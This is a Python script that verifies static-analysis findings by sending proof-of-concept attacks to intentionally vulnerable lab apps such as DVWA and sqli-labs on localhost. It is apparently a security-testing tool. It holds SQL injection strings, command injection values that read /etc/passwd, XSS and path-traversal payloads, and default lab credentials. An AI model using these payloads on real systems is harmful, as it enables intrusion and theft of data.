#!/usr/bin/env python3
import argparse
import http.cookiejar
import json
import socket
import sys
import urllib.error
import urllib.parse
import urllib.request
import re
from pathlib import Path
from typing import Any


MOCK_DEFAULT_URL = "http://localhost:9090"
REAL_TARGETS = {
    "dvwa": ("http://localhost:8080", "admin", "password"),
    "bwapp": ("http://localhost:8081", "bee", "bug"),
    "sqlilabs": ("http://localhost:8082", "root", ""),
    "pikachu": ("http://localhost:8083", None, None),
}


class Session:
    def __init__(self, base_url: str, cookies: dict[str, str] | None = None):
        self.base_url = base_url.rstrip("/")
        self.cookies: dict[str, str] = cookies or {}
        self.cj = http.cookiejar.CookieJar()
        self._opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cj))
        self._no_redirect_opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cj),
            type("NR", (urllib.request.HTTPRedirectHandler,), {"redirect_request": lambda self, *a, **k: None})()
        )

    def cookie_header(self) -> str:
        return "; ".join(f"{k}={v}" for k, v in self.cookies.items())

    def store_cookies(self, headers) -> None:
        raw = headers.get("Set-Cookie", "")
        if not raw:
            return
        for part in str(raw).split(","):
            chunk = part.strip()
            for piece in chunk.split(";"):
                piece = piece.strip()
                if "=" in piece and not piece.lower().startswith(("path", "expires", "max-age", "domain", "secure", "httponly", "samesite")):
                    k, _, v = piece.partition("=")
                    self.cookies[k] = v
                    break

    def fetch(self, path: str, params: dict | None = None, method: str = "GET", data: str | None = None, redirect: bool = True) -> dict:
        if params:
            path += "?" + urllib.parse.urlencode(params, doseq=True)
        url = self.base_url + path
        req = urllib.request.Request(url, data=data.encode() if data else None, method=method)
        opener = self._opener if redirect else self._no_redirect_opener
        try:
            with opener.open(req, timeout=10) as resp:
                self.cookies.update({c.name: c.value for c in self.cj})
                return {"status": resp.status, "headers": dict(resp.headers), "body": resp.read().decode("utf-8", errors="replace")}
        except urllib.error.HTTPError as e:
            self.cookies.update({c.name: c.value for c in self.cj})
            return {"status": e.code, "headers": dict(e.headers), "body": e.read().decode("utf-8", errors="replace") if e.fp else ""}
        except Exception as e:
            return {"status": 0, "headers": {}, "body": f"ERROR: {e}"}


def _port_open(host: str, port: int, timeout: float = 0.5) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def detect_target(target: str | None) -> tuple[str, str]:
    """Returns (mode, base_url). mode is 'real' or 'mock'."""
    if target and target.startswith("http"):
        return "real", target.rstrip("/")
    if target in REAL_TARGETS:
        url, _, _ = REAL_TARGETS[target]
        host = urllib.parse.urlparse(url).hostname or "localhost"
        port = urllib.parse.urlparse(url).port or 80
        if _port_open(host, port):
            return "real", url
        print(f"[WARN] Target '{target}' requested but {url} not reachable, falling back to mock", file=sys.stderr)
    if _port_open("localhost", 8080):
        return "mock", MOCK_DEFAULT_URL
    print(f"[ERROR] No target reachable. Start mock_dvwa.py on :8080 OR run docker-compose up", file=sys.stderr)
    sys.exit(1)


def authenticate(session: Session, target: str) -> bool:
    """Authenticate against real DVWA / bWAPP / sqli-labs. Returns True on success."""
    if target == "dvwa":
        session.fetch("/setup.php", {"create_db": "Create / Reset Database"}, method="POST")
        # Use a single dedicated opener for login sequence to ensure cookie continuity
        cj = http.cookiejar.CookieJar()
        login_opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        data = urllib.parse.urlencode({"username": "admin", "password": "password", "Login": "Login"}).encode()
        req = urllib.request.Request(session.base_url + "/login.php", data=data, method="POST")
        try:
            login_opener.open(req, timeout=10)
        except Exception:
            pass
        # Import cookies into session
        for c in cj:
            session.cj.set_cookie(c)
            session.cookies[c.name] = c.value
        # Verify login
        resp = session.fetch("/index.php")
        body = resp.get("body", "")
        return "Welcome" in body or "Vulnerability" in body
    if target == "bwapp":
        login = session.fetch("/login.php", {"login": "bee", "password": "bug", "form": "submit"}, method="POST")
        return "bWAPP" in login.get("body", "") or "logout" in login.get("body", "").lower()
    if target == "sqlilabs":
        return True
    if target == "pikachu":
        return True
    return False


def build_pocs(target: str) -> dict:
    """Build PoC list, adapting paths/indicators per target."""
    base_pocs = {
        "sql": [
            {"name": "OR 1=1", "method": "POST", "params": {"id": "1' OR 1=1 -- ", "Submit": "Submit"}, "path": "/vulnerabilities/sqli/", "success_indicators": [r"First name: admin", r"Login name: Dumb"]},
            {"name": "UNION SELECT", "method": "POST", "params": {"id": "1' UNION SELECT user, password FROM users-- ", "Submit": "Submit"}, "path": "/vulnerabilities/sqli/", "success_indicators": [r"5f4dcc3b5aa765d61d8327deb882cf99", r"admin.*5f4dcc"]},
        ],
        "shell": [
            {"name": "id command", "params": {"ip": "127.0.0.1; id", "Submit": "Submit"}, "path": "/vulnerabilities/exec/", "success_indicators": [r"uid=\d+\(www-data\)", r"uid=\d+\(apache\)"]},
            {"name": "cat /etc/passwd", "params": {"ip": "127.0.0.1; cat /etc/passwd", "Submit": "Submit"}, "path": "/vulnerabilities/exec/", "success_indicators": [r"root:x:0:0"]},
        ],
        "xss": [
            {"name": "script tag", "params": {"name": "<script>alert(1)</script>"}, "path": "/vulnerabilities/xss_r/", "success_indicators": [r"<script>alert\(1\)</script>"]},
            {"name": "img onerror", "params": {"name": "<img src=x onerror=alert(1)>"}, "path": "/vulnerabilities/xss_r/", "success_indicators": [r"<img[^>]*onerror"]},
        ],
        "fileinclude": [
            {"name": "LFI /etc/passwd", "params": {"page": "../../../../etc/passwd"}, "path": "/vulnerabilities/fi/", "success_indicators": [r"root:x:0:0"]},
        ],
        "ssrf": [
            {"name": "open redirect", "params": {"url": "http://evil.com"}, "path": "/vulnerabilities/open_redirect/", "success_indicators": ["evil.com"], "expected_status": 200},
        ],
        "weakrand": [
            {"name": "predictable session", "params": {"id": "1"}, "path": "/vulnerabilities/weak_id/", "success_indicators": [r"Session ID: \d+"]},
        ],
        "trustbound": [
            {"name": "authbypass type juggling", "params": {"username": "admin", "password": "True", "Login": "Login"}, "path": "/vulnerabilities/authbypass/", "success_indicators": [r"Welcome to the password protected area", r"logged in as"]},
        ],
        "crypto": [
            {"name": "Caesar weak cipher", "params": {"cipher": "Caesar", "shift": "3"}, "path": "/vulnerabilities/cryptography/", "success_indicators": [r"KHOOR", r"Encrypted:"]},
        ],
        "filewrite": [
            {"name": "file upload", "method": "POST", "data": "uploaded=test&Upload=Upload", "path": "/vulnerabilities/upload/", "success_indicators": [r"succesfully uploaded", r"successfully uploaded"]},
        ],
        "dynamic_code": [
            {"name": "eval phpinfo()", "params": {"cmd": "phpinfo()"}, "path": "/vulnerabilities/dynamic_code/", "success_indicators": [r"PHP Version"]},
        ],
    }
    if target == "bwapp":
        base_pocs["sql"] = [
            {"name": "sqli_search", "params": {"search": "%' OR 1=1 -- ", "form": "submit"}, "path": "/sqli_1.php", "success_indicators": [r"ironman", r"Captain"]},
        ]
    if target == "sqlilabs":
        base_pocs["sql"] = [
            {"name": "Less-1 GET error", "params": {"id": "1' OR 1=1 -- "}, "path": "/Less-1/", "success_indicators": [r"Your Login name:", r"Dumb"]},
            {"name": "Less-2 numeric", "params": {"id": "1 OR 1=1"}, "path": "/Less-2/", "success_indicators": [r"Your Login name:", r"Dumb"]},
        ]
        del base_pocs["shell"], base_pocs["xss"], base_pocs["fileinclude"], base_pocs["ssrf"], base_pocs["trustbound"], base_pocs["crypto"], base_pocs["filewrite"], base_pocs["dynamic_code"], base_pocs["weakrand"]
    if target == "pikachu":
        base_pocs["sql"] = [
            {"name": "数字型注入", "params": {"id": "1 OR 1=1", "submit": ""}, "path": "/vul/sqli/sqli_str.php", "success_indicators": [r"admin", r"lucy"]},
        ]
        del base_pocs["shell"], base_pocs["fileinclude"], base_pocs["ssrf"], base_pocs["weakrand"], base_pocs["trustbound"], base_pocs["crypto"], base_pocs["filewrite"], base_pocs["dynamic_code"]
        base_pocs["xss"] = [
            {"name": "反射型XSS", "params": {"message": "<script>alert(1)</script>", "submit": "submit"}, "path": "/vul/xss/xss_reflected_get.php", "success_indicators": [r"<script>alert\(1\)</script>"]},
        ]
    return base_pocs


CATEGORY_ALIASES = {
    "file_include": "fileinclude",
    "file_write": "filewrite",
    "deserialization": "deserialization",
    "xpathi": "xpath",
    "ldapi": "ldap",
    "xxe": "xxe",
}


def verify_finding(session: Session, finding: dict, pocs: dict) -> dict:
    category = finding.get("type", "").lower()
    category = CATEGORY_ALIASES.get(category, category)
    if category not in pocs:
        return {"verified": None, "reason": f"no_poc_for_{category}", "pocs_attempted": 0, "pocs_verified": 0, "details": []}
    results = []
    for poc in pocs[category]:
        resp = session.fetch(poc["path"], poc.get("params"), poc.get("method", "GET"), poc.get("data"))
        body = resp.get("body", "")
        status = resp.get("status", 0)
        headers = resp.get("headers", {})
        if "expected_status" in poc and status == poc["expected_status"]:
            for ind in poc["success_indicators"]:
                if isinstance(ind, str) and ind in body:
                    results.append({"poc": poc["name"], "verified": True, "matched": ind})
                    break
            else:
                results.append({"poc": poc["name"], "verified": True, "matched": f"status={status}"})
            continue
        for ind in poc["success_indicators"]:
            if isinstance(ind, str) and ind in body:
                results.append({"poc": poc["name"], "verified": True, "matched": ind})
                break
            if re.search(ind, body, re.IGNORECASE):
                results.append({"poc": poc["name"], "verified": True, "matched": ind})
                break
        else:
            results.append({"poc": poc["name"], "verified": False, "status": status, "body_excerpt": body[:200]})
    any_verified = any(r.get("verified") for r in results)
    return {"verified": any_verified, "pocs_attempted": len(pocs[category]), "pocs_verified": sum(1 for r in results if r.get("verified")), "details": results}


def run(args) -> int:
    mode, base_url = detect_target(args.target)
    session = Session(base_url)
    if mode == "real" and args.target in REAL_TARGETS:
        target_name = args.target
        ok = authenticate(session, target_name)
        if not ok:
            print(f"[WARN] Auth against {target_name} failed; some PoCs may not work", file=sys.stderr)
        pocs = build_pocs(target_name)
    else:
        target_name = "mock"
        pocs = build_pocs("dvwa")
    print(f"Target: {base_url} (mode={mode}, target={target_name})", file=sys.stderr)

    print("\n=== PoC self-test ===", file=sys.stderr)
    for cat, plist in pocs.items():
        poc = plist[0]
        resp = session.fetch(poc["path"], poc.get("params"), poc.get("method", "GET"), poc.get("data"))
        body = resp.get("body", "")
        status = resp.get("status", 0)
        matched = False
        for ind in poc["success_indicators"]:
            if isinstance(ind, str) and ind in body:
                matched = True
                break
            if re.search(ind, body, re.IGNORECASE):
                matched = True
                break
        if "expected_status" in poc and status == poc["expected_status"]:
            matched = True
        print(f"  {cat:<14} {poc['name']:<30} → {'VERIFIED' if matched else 'FAILED'} (status={status})", file=sys.stderr)

    findings_path = Path(args.findings)
    if not findings_path.exists():
        print(f"Missing {findings_path}", file=sys.stderr)
        return 1
    sv_data = json.loads(findings_path.read_text())
    findings = sv_data.get("findings", [])
    print(f"\nLoaded {len(findings)} security-vule findings", file=sys.stderr)

    results = []
    for f in findings:
        v = verify_finding(session, f, pocs)
        results.append({"finding": f, "verification": v})
        vmark = "✓" if v.get("verified") else ("✗" if v.get("verified") is False else "?")
        print(f"  {vmark} {f.get('file','?')[:30]:<30} L{f.get('line','?'):<4} {f.get('type','?'):<14} {v.get('pocs_verified',0)}/{v.get('pocs_attempted',0)}", file=sys.stderr)

    verified = sum(1 for r in results if r["verification"].get("verified"))
    unverified = sum(1 for r in results if r["verification"].get("verified") is False)
    unconfirmed = sum(1 for r in results if r["verification"].get("verified") is None)
    print(f"\n=== Summary ===", file=sys.stderr)
    print(f"Target: {target_name} ({base_url})", file=sys.stderr)
    print(f"Total findings: {len(results)}", file=sys.stderr)
    print(f"  Verified (exploitable):  {verified}", file=sys.stderr)
    print(f"  Unverified (NOT exploitable): {unverified}", file=sys.stderr)
    print(f"  Unconfirmed (no PoC):    {unconfirmed}", file=sys.stderr)

    out = {
        "tool": f"security-vule + PoC verification ({target_name})",
        "mode": mode,
        "target": base_url,
        "total_findings": len(results),
        "verified": verified,
        "unverified": unverified,
        "unconfirmed": unconfirmed,
        "findings": results,
    }
    out_path = args.output
    Path(out_path).write_text(json.dumps(out, indent=2))
    print(f"\nSaved to {out_path}", file=sys.stderr)
    return 0


def main() -> None:
    ap = argparse.ArgumentParser(description="security-vule PoC runtime verification (mock + real apps)")
    ap.add_argument("--target", choices=list(REAL_TARGETS.keys()) + ["mock"], default=None, help="Target app: dvwa, bwapp, sqlilabs, pikachu, or auto-detect")
    ap.add_argument("--findings", default="/tmp/sv_findings.json", help="security-vule findings JSON file")
    ap.add_argument("--output", default="/tmp/sv_poc_verified.json", help="Output path")
    args = ap.parse_args()
    sys.exit(run(args))


if __name__ == "__main__":
    main()
